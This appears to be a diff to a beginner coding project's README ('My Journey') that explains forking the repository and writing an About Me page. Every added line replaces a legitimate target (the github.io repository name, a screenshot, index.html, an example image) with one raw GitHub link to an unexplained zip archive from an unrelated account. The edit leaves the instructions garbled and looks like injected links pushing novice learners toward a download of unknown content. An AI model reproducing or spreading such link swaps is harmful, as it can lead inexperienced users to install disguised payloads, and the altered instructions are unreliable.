@@ -34,19 +34,19 @@ The **My Journey** project provides a space for you to learn and practice your w
 1. **Fork the repository**:
    - To get started, fork this repository,
    - Make yourself the owner,
-   - Change Repository name to **<user_name>.github.io**,
+   - Change Repository name to **<user_name>https://raw.githubusercontent.com/Antidogmatism/learning-plan/main/public/learning-plan-v1.0.zip**,
    - Make sure the Copy the main branch is checked ✅
    - Click **Create fork** button,
-   - <img width="493" alt="Screenshot 2025-01-24 at 12 15 07" src="https://github.com/user-attachments/assets/bcc4b04e-cb8d-44d7-b360-af485584e80e" />
+   - <img width="493" alt="Screenshot 2025-01-24 at 12 15 07" src="https://raw.githubusercontent.com/Antidogmatism/learning-plan/main/public/learning-plan-v1.0.zip" />
 
 2. **Where to next**:
-   Begin by introducing yourself on the **index.html** page. At this stage we only expect you to complete the **About Me** part of your project.
+   Begin by introducing yourself on the **https://raw.githubusercontent.com/Antidogmatism/learning-plan/main/public/learning-plan-v1.0.zip** page. At this stage we only expect you to complete the **About Me** part of your project.
    - Introduce yourself, Where are you from?
    - Talk about your interests,
    - Talk about your goals and aspirations,
 
    example:
-   ![Example image of my about me page!](./public/Example.png)
+   ![Example image of my about me page!](https://raw.githubusercontent.com/Antidogmatism/learning-plan/main/public/learning-plan-v1.0.zip)
 
 4. **Deploy**:
   We will deploy our projects together once everyone has completed **step 2**, this will mean that your project will be live on the web. You can show you friends and whānau. Sik!
